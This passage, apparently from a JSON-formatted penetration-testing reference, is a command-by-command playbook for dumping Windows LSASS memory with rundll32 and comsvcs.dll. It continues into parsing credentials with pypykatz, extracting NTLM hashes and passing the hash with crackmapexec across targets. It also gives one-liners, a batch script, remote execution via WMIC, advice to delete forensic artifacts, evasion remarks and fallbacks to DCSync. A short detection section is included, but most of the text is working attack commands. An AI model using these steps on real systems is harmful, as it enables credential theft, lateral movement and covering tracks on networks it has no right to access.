shell)\n2. Verify admin rights: whoami /groups (look for Administrators + High Mandatory Level)\n3. Get LSASS PID: tasklist /fi \"imagename eq lsass.exe\" (note PID, usually 600-800)\n4. Create output directory: mkdir C:\\Windows\\Temp (or use existing writable location)\n5. Dump LSASS: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> C:\\Windows\\Temp\\lsass.dmp full\n6. Verify dump: dir C:\\Windows\\Temp\\lsass.dmp (check 40-200MB size, recent timestamp)\n7. Download dump: Evil-WinRM → download C:\\Windows\\Temp\\lsass.dmp OR SMB copy to Kali\n8. Cleanup: del C:\\Windows\\Temp\\lsass.dmp\n9. Parse on Kali: pypykatz lsa minidump lsass.dmp > creds.txt\n10. Extract hashes: grep \"NT:\" creds.txt | awk '{print $2}' > ntlm.txt\n11. Pass-the-Hash: crackmapexec smb <TARGETS> -H ntlm.txt\n\nDETECTION NOTES:\n- Event ID 4688: Process creation (rundll32.exe execution)\n- Event ID 4656/4663: LSASS process handle/memory access (if auditing enabled)\n- SIEM alerts: LSASS memory dump triggers in mature environments\n- rundll32.exe calling comsvcs.dll for non-COM+ process is suspicious\n- Legitimate use: COM+ application debugging (rare on normal systems)\n- Detection evasion: comsvcs.dll is Microsoft-signed (low base suspicion)\n\nCOMMON MISTAKES:\n1. Forgetting comma after comsvcs.dll in syntax (CRITICAL - command fails without)\n2. Using wrong PID (dumps wrong process, no credentials)\n3. Not creating output directory first (C:\\Temp may not exist)\n4. Using 'normal' instead of 'full' dump type (misses credentials)\n5. Not verifying dump file size (0 KB dump = failed silently)\n6. Leaving dump on target (forensic artifact - always delete after download)\n\nADVANCED USAGE:\n- PowerShell one-liner with auto-PID:\n  (Get-Process lsass).Id | %{rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump $_ C:\\Temp\\lsass.dmp full}\n\n- Batch script with error handling:\n  @echo off\n  for /f \"tokens=2\" %%i in ('tasklist /fi \"imagename eq lsass.exe\"') do set PID=%%i\n  rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump %PID% C:\\Temp\\lsass.dmp full\n  if exist C:\\Temp\\lsass.dmp (echo Success) else (echo Failed)\n\n- Remote execution via WMI/PSExec:\n  wmic /node:<TARGET> process call create \"rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> C:\\Temp\\lsass.dmp full\"\n  (requires WMI access + remote path)\n\nCREDENTIAL GUARD NOTES:\nIf Credential Guard enabled:\n- comsvcs.dll dump may still succeed (creates file)\n- But dump contains no credentials (pypykatz shows empty)\n- Solution: Pivot to DCSync (if DA) or registry dumps (SAM/LSA Secrets)\n- Detection: If dump succeeds but pypykatz shows no credentials, likely Credential Guard\n\nWHY COMSVCS WORKS:\nLegitimate Windows debugging feature:\n1. COM+ Services (Component Object Model) are Windows service infrastructure\n2. Developers debug COM+ app crashes using memory dumps\n3. comsvcs.dll provides MiniDump API for this purpose\n4. API works on ANY process (design flaw from security perspective)\n5. rundll32 allows command-line DLL function calls\n6. Combined: rundll32 + comsvcs.dll + MiniDump = LSASS dump with no tools"
    }
  ]
}
